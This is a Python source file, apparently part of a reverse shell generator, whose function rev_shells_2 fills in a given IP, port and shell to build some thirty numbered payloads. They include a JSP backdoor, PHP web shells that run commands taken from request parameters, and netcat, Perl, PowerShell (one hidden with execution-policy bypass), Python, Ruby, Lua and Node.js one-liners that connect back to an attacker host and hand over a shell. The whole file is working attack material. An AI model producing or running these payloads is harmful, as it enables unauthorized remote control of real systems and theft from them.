# Define a function to generate reverse shell commands based on user inputs
def rev_shells_2(num, ip, port, shell):
    
    # Convert the port to a string
    port = str(port)

     # Define different reverse shell commands for various languages
    java_web = '''
<%@
page import="java.lang.*, java.util.*, java.io.*, java.net.*"
% >
<%!
static class StreamConnector extends Thread
{
        InputStream is;
        OutputStream os;
        StreamConnector(InputStream is, OutputStream os)
        {
                this.is = is;
                this.os = os;
        }
        public void run()
        {
                BufferedReader isr = null;
                BufferedWriter osw = null;
                try
                {
                        isr = new BufferedReader(new InputStreamReader(is));
                        osw = new BufferedWriter(new OutputStreamWriter(os));
                        char buffer[] = new char[8192];
                        int lenRead;
                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
                        {
                                osw.write(buffer, 0, lenRead);
                                osw.flush();
                        }
                }
                catch (Exception ioe)
                try
                {
                        if(isr != null) isr.close();
                        if(osw != null) osw.close();
                }
                catch (Exception ioe)
        }
}
%>

<h1>JSP Backdoor Reverse Shell</h1>

<form method="post">
IP Address
<input type="text" name="ipaddress" size=30>
Port
<input type="text" name="port" size=10>
<input type="submit" name="Connect" value="Connect">
</form>
<p>
<hr>

<%
String ipAddress = request.getParameter("ipaddress");
String ipPort = request.getParameter("port");
if(ipAddress != null && ipPort != null)
{
        Socket sock = null;
        try
        {
                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
                Runtime rt = Runtime.getRuntime();
                Process proc = rt.exec("cmd.exe");
                StreamConnector outputConnector =
                        new StreamConnector(proc.getInputStream(),
                                          sock.getOutputStream());
                StreamConnector inputConnector =
                        new StreamConnector(sock.getInputStream(),
                                          proc.getOutputStream());
                outputConnector.start();
                inputConnector.start();
        }
        catch(Exception e) 
}
%>'''
    javascript = '''
String command = "var host = \''''+ip+'''\';" +
                       "var port = '''+port+''';" +
                       "var cmd = \''''+shell+'''\';"+
                       "var s = new java.net.Socket(host, port);" +
                       "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
                       "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
                       "var po = p.getOutputStream(), so = s.getOutputStream();"+
                       "print ('Connected');"+
                       "while (!s.isClosed()) {"+
                       "    while (pi.available() > 0)"+
                       "        so.write(pi.read());"+
                       "    while (pe.available() > 0)"+
                       "        so.write(pe.read());"+
                       "    while (si.available() > 0)"+
                       "        po.write(si.read());"+
                       "    so.flush();"+
                       "    po.flush();"+
                       "    java.lang.Thread.sleep(50);"+
                       "    try {"+
                       "        p.exitValue();"+
                       "        break;"+
                       "    }"+
                       "    catch (e) {"+
                       "    }"+
                       "}"+
                       "p.destroy();"+
                       "s.close();";
String x = "\\"\\".getClass().forName(\\"javax.script.ScriptEngineManager\\").newInstance().getEngineByName(\\"JavaScript\\").eval(\\""+command+"\\")";
ref.add(new StringRefAddr("x", x);'''

    lua_1 = '''lua -e "require('socket');require('os');t=socket.tcp();t:connect(\''''+ip+'''\',\''''+port+'''\');os.execute(\''''+shell+''' -i <&3 >&3 2>&3');"'''
    
    lua_2 = '''lua5.1 -e 'local host, port = "'''+ip+'''", '''+port+''' local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\''''

    nc_c = f"nc -c {shell} {ip} {port}"

    nc_e = f"nc {ip} {port} -e {shell}"

    nc_mkfifo = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f"
    
    nc_exe = f"nc.exe {ip} {port} -e {shell}"
    
    ncat_exe = f"ncat.exe {ip} {port} -e {shell}"

    ncat_udp = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f"

    node_js_1 = f"require('child_process').exec('nc -e {shell} {ip} {port}')"

    node_js_2 = '''
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("'''+shell+'''", []);
    var client = new net.Socket();
    client.connect('''+port+''', "'''+ip+'''", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();'''

    perl = '''perl -e 'use Socket;$i="'''+ip+'''";$p='''+port+''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("'''+shell+''' -i");};\''''

    perl_sh = '''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"'''+ip+''':'''+port+'''");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''''

    php_cmd_1 = '''
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>'''

    php_cmd_2 = '''<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>'''

    php_cmd_small = '''<?=`$_GET[0]`?>'''

    php_cmd_exec = '''php -r '$sock=fsockopen("'''+ip+'''",'''+port+''');exec("'''+shell+''' <&3 >&3 2>&3");\''''

    php_passthru = '''php -r '$sock=fsockopen("'''+ip+'''",'''+port+''');passthru("'''+shell+''' <&3 >&3 2>&3");\''''

    php_popen =  '''php -r '$sock=fsockopen("'''+ip+'''",'''+port+''');popen("'''+shell+''' <&3 >&3 2>&3", "r");\''''

    php_proc_open = '''php -r '$sock=fsockopen("'''+ip+'''",'''+port+''');$proc=proc_open("'''+shell+'''", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\''''

    php_shell_exec = '''php -r '$sock=fsockopen("'''+ip+'''",'''+port+''');shell_exec("'''+shell+''' <&3 >&3 2>&3");\''''

    powershell_1 = '''$LHOST = "'''+ip+'''"; $LPORT = '''+port+'''; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'''

    powershell_2 = '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\''''+ip+'''\','''+port+''');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'''

    powershell_3 = '''powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\''''+ip+'''\', '''+port+''');$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"'''

    powershell_4 = '''$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient(\''''+ip+'''\', '''+port+''');$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()'''

    python_1 = '''export RHOST="'''+ip+'''";export RPORT='''+port+''';python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("'''+shell+'''")\''''

    python_2 = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'''+ip+'''",'''+port+'''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("'''+shell+'''")\''''

    python3_1 = '''export RHOST="'''+ip+'''";export RPORT='''+port+''';python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("'''+shell+'''")\''''
    
    python3_2 = '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'''+ip+'''",'''+port+'''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("'''+shell+'''")\''''

    python3_short = '''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("'''+ip+'''",'''+port+'''));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("'''+shell+'''")\''''

    python3_windows = '''
import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("'''+ip+'''",'''+port+'''))

p=subprocess.Popen(["'''+shell+'''"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()'''

    ruby = '''ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("'''+ip+'''",'''+port+'''))\''''

    ruby_no_sh = '''ruby -rsocket -e'exit if fork;c=TCPSocket.new("'''+ip+'''","'''+port+'''");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}\''''

    # Select and return the appropriate reverse shell command based on user input
    if num == 22:
        return java_web
    elif num == 23:
        return javascript
    elif num == 24:
        return lua_1
    elif num == 25:
        return lua_2
    elif num == 26:
        return nc_c
    elif num == 27:
        return nc_e
    elif num == 28:
        return nc_mkfifo
    elif num == 29:
        return nc_exe
    elif num == 30:
        return ncat_exe
    elif num == 31:
        return ncat_udp
    elif num == 32:
        return node_js_1
    elif num == 33:
        return node_js_2
    elif num == 34:
        return perl
    elif num == 35:
        return perl_sh
    elif num == 36:
        return php_cmd_1
    elif num == 37:
        return php_cmd_2
    elif num == 38:
        return php_cmd_small
    elif num == 39:
        return php_cmd_exec
    elif num == 40:
        return php_passthru
    elif num == 41:
        return php_popen
    elif num == 42:
        return php_proc_open
    elif num == 43:
        return php_shell_exec
    elif num == 44:
        return powershell_1
    elif num == 45:
        return powershell_2
    elif num == 46:
        return powershell_3
    elif num == 47:
        return powershell_4
    elif num == 48:
        return python_1
    elif num == 49:
        return python_2
    elif num == 50:
        return python3_1
    elif num == 51:
        return python3_2
    elif num == 52:
        return python3_short
    elif num == 53:
        return python3_windows
    elif num == 54:
        return ruby
    elif num == 55:
        return ruby_no_sh
    else:
        return 0
    
